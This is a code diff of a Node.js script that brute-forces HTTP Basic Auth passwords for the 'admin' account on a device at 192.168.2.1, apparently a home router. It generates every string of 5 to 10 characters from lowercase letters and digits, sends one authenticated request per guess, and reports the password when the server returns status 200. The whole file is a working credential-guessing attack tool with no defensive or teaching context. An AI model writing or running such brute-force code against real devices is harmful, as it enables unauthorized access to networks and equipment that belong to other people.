@@ -1,54 +1,73 @@
-var http = require("http"),
-	fs = require("fs"),
+var http = require('http'),
+	fs = require('fs'),
 	result = {};
 
 var option = {
-	host: "192.168.2.1",
+	host: '192.168.2.1',
 	port: 80,
-	path: "/",
-	method: "GET"
+	path: '/',
+	method: 'GET',
+	imgTimeout: 10000,
+	count: 0
 };
 
-// var word = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n'];
-	
-var word = ['a', 'd', 'm', 'n', 'i'];
-var queue = 0;
+var word = '0123456789abcdefghijklmnopqrstuvwxyz';
+// var word = 'admin'; 
+http.globalAgent.maxSockets = 1;
 
-function crack (user, pwd, time) {
-	var req;
-	option.auth = user + ":" + pwd;
-	req = http.request(option, function(res) {
-		// console.log(pwd);
-		if(res.statusCode == '200'){
-			console.log('Done password is ' + pwd);
-		}
+function crack (pwd) {
+	option.auth = 'admin:' + pwd;
+	http.get(option, function (res) {
+		res.on('data', function () {
+			if(res.statusCode == '200'){
+				console.log('Done password is ' + pwd);
+			}
+			else{
+				console.log('Not ' + pwd);
+			}
+			res.destroy();
+		});
+	}).on('error', function(e) {
+		// console.log('error retry');
+		// crack(pwd)
+	}).setTimeout(option.imgTimeout, function(){
+		status = 'timeout';
+		this.socket.destroy();
 	});
-	req.on('error', function(e) {
-		if(e.code == "ECONNRESET"){
-			console.log(++queue);
-		}
-		console.log(e);
-	});
-	req.end();
 }
 
-function wordRecursion (word, len, result) {
-	for (var i = 0; i < word.length; i++) {
-		result[len] = word[i];
-		if (len > 0) {
-			arguments.callee(word, len - 1, result);
-			continue;
-		}
-		crack("admin", result.join(""));
+function setWord (min, max, word, callback) {
+	var initArray = [];
+		initArray.length = min;
+		initArray.forEach(function (t) {
+			t = word[0];
+		});
+
+
+	for (var i = min; i <= max; i++) {		
+		wordRecursion(initArray, word, callback);
+		initArray.push(word[0]);
 	}
 }
 
-function numMaker (len) {
-	var pre = [];
-	for (var i = 0; i < len; i++) {
-		pre.push(word[0]);
-	}
-	wordRecursion(word, len - 1, pre)
+function wordRecursion (arr, word, callback, index) {
+	index = index || 0;
+	word.forEach(function (t) {
+		arr[index] = t;
+		if (index < arr.length - 1) {
+			wordRecursion(arr, word, callback, index + 1);
+			return true;
+		}
+		callback && callback(arr);
+	});
 }
 
-numMaker(5);
+crack('admin');
+
+setWord(5, 10, word.split(''), function (data) {
+	// console.log(++option.count, data.join(''));
+	crack(data.join(''));
+});
+
+
+// wordRecursion(['0', '0'], word.split(''))
